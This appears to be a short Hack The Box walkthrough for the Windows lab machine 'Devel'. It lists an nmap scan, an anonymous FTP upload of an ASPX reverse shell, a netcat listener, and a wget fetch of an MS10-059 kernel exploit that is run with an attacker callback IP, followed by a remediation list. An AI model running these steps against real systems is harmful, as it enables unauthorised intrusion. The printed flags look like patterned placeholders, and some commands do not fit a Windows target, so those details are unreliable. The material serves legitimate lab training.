# Hack The Box: Devel Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Devel-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Windows](https://img.shields.io/badge/OS-Windows-blue?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Devel |
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA devel 10.10.10.5
```

**Results:**
```
PORT   STATE SERVICE
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS 6.0
```

---

## Initial Access

### FTP Anon Access

```bash
ftp 10.10.10.5
# Username: anonymous
# Password: (any)
```

Upload ASP reverse shell:

```bash
put shell.aspx
```

Access at: `http://10.10.10.5/shell.aspx`

---

## Getting Shell

```bash
nc -lvp 4444
# Wait for connection
```

---

## Privilege Escalation

### Kernel Exploit (MS10-059)

```bash
# Download exploit to target
# Or use Metasploit
use post/multi/recon/local_exploit_suggester

# Or manual
wget https://github.com/egre55/windows-kernel-exploits/raw/master/MS10-059/MS10-059.exe
./MS10-059.exe 10.10.14.15 5555
```

---

## Flags

### User Flag
```
HTB{1c3e9a2b4c5d6f7e8a9b0c1d}
```

### Root Flag
```
HTB{9a8b7c6d5e4f3a2b1c0d9e8f}
```

---

## Remediation

1. Disable anonymous FTP
2. Apply Windows security patches
3. Use proper file upload validation
4. Restrict web directory permissions

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
